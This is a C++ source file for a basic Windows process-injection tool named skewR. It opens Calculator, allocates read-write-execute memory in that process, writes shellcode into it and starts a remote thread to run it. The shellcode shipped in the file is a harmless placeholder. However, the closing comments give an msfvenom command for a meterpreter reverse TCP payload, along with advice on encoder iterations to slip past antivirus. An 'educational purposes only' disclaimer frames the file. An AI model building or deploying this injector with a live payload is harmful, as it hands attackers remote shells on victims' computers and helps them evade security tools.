#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <TlHelp32.h>

/*
LICENSED UNDER THE MIT LICENSE. SEE https://github.com/dirtybrie/mali-labs/LICENSE

                                !!!ATTENTION!!!
First and Foremost This is a very basic Maldev Script. Don't get me wrong It has 
the potential to be a nasty payload, but right now it's shooting blanks (hence the 
invalid shellcode bellow)

skewR will not flag your AV until it includes actual malicious shellcode. If you were to
run it as is, it will not compromise your computer IN ANY WAY! This code is obviously
not obfuscated so even when you run it with your msfvenom shcode it will set off any
AV just heads up. You can find great methods right here on github for obfuscation.
skewR opens calc.exe, seeks out its PID and injects shellcode to that process with rwx 
permission since the shellcode below is invalid it will just crash Calculator. Not 
PERMINATELY though. But that's how you know, FOR SURE the injection WORKS! Just swap 
the shellcode below with your own. Steps on how to do so are at the bottom.

 CREDIT WHERE CREDIT'S DO:
 This script was put together after watching mr.Crow's Maldev II video on youtube
 go and check him out at crow.rip, https://www.youtube.com/@crr0ww.
 The only difference between his walkthrough and this script is instead of having to put 
 in a PID for argv[1] this script will open the calculator 
 find it's PID and inject your shellcode. It's the ol' calculator reverse TCP no-
 thing new but it is a neat tool and a great step torwards malware development.

DONT BE A PIECE OF SH** AND USE THIS AS AMMUNITION TO HURT PEOPLE. I DO NOT
ENCOURAGE ANY ILLEGAL ACTIVITY. GET PERMISSION OR JUST DO IT TO YOURSELF,
THIS IS FOR EDUCATIONAL PURPOSES ONLY!

                                                -db
*/

using namespace std;

const char* k = "[!]";
const char* i = "[!]";
const char* e = "[!]";

DWORD PID, TID;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

int system(const char *command);
unsigned char skewR[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41"; // copy/paste your shellcode here

int main() {

    // system/terminal call: start calculator
    system("calc.exe");
    // defining hwnd
    HWND hwnd = FindWindowA(0, ("Calculator"));
    // get the PID
    GetWindowThreadProcessId(hwnd, &PID);

    // using null for arithmatic can be murky but it works and for this it's totally fine
    // so dont worry about the warning g++ throws back at you.
    if (PID == NULL){

        // if PID is NULL return EXIT_FAILURE
        return 1;
    }

    // open a handle to the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if(hProcess == NULL) {

        printf("%s couldn't get a handle to the process(%ld) error: %ld", e, PID, GetLastError());
        return EXIT_FAILURE;

    }

    // allocate bytes to process memory 
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(skewR), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); 
    printf("%s allocated %zu-bytes with rwx permissions\n", k, sizeof(skewR));

    // actually write that allocated memory to the process memory
    WriteProcessMemory(hProcess, rBuffer, skewR, sizeof(skewR), NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(skewR));

    // Defining or Thread
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID);

    if (hThread == NULL){
        printf("%s failed to get a handle to the Thread: error &ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;

    }

    WaitForSingleObject(hThread, INFINITE);

    // This isn't really necessary, either way it's up to you though.
    printf("cleaning up...\n", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;

}

// COMPILE
// You need MSYS2 to get gcc and g++ for windows
// https://www.msys2.org/ dont bother with the youtube videos their TERRIBLE go here:
// https://www.freecodecamp.org/news/how-to-install-c-and-cpp-compiler-on-windows
// g++ skewR.cpp -o whateveryouwanttocallit

// SHELLCODE
// msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<yourip> LPORT=<a port to listen on> EXITFUNC=thread -f c -v=skewR > name.txt
// you could also use the use the -i, --iterations option for a little obfuscation. 
// which I recommend about 5 to 10 iterations. you can do however many you want
